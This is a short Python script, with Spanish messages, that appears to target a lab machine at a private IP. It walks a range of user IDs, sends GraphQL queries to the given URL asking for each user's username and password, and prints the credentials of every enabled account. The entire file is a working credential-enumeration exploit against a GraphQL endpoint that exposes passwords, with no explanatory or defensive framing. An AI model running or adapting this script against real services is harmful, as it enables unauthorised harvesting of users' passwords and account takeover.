#!/usr/bin/python3

import signal, requests, sys, argparse

def def_handler(sig, frame):
    print("\n\n[!] Saliendo.... \n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_Arguments():
    parser = argparse.ArgumentParser(description="Identificador de ID válido")
    parser.add_argument("-u", "--url", dest="url", help="Definir la url de la web (Ejemplo: -u https://holamundo.com)")
    parser.add_argument("-r", "--rango", dest="rango", help="Definir el rango de IDs (Ejemplo: -r 1-100) ")

    options = parser.parse_args()

    if options.url is None or options.rango is None:
        parser.print_help()
        exit(1)

    return options.url, options.rango

headers = {
    "Host" : "192.168.74.130",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",
    "Referer": "http://192.168.74.130/",
    "Content-Type": "application/json; charset=utf-8",
    "Origin": "http://192.168.74.130",
}

def descJson(data):

    response = data.json()
    data = response["data"]["users"]
    user = data["username"]
    passwd = data["password"]

    return user, passwd


def fuzzing(main_url, minimo, maximo):

    for id in range(minimo, maximo):
        query = "{users(id:%s) {username password}}" %id

        data = {
            "query": query
        }


        r = requests.post(main_url, headers=headers,json=data)

        if "Disabled user" not in r.text:
            creds = descJson(r)
            print(f"\n====== User id {id} =========")
            print(f"Usuario: {creds[0]}")
            print(f"Passwd: {creds[1]}\n\n")

if __name__ == '__main__':
    url,rango = get_Arguments()
    minimo = int(rango.split('-')[0])
    maximo = int(rango.split('-')[1])

    fuzzing(url, minimo, maximo)
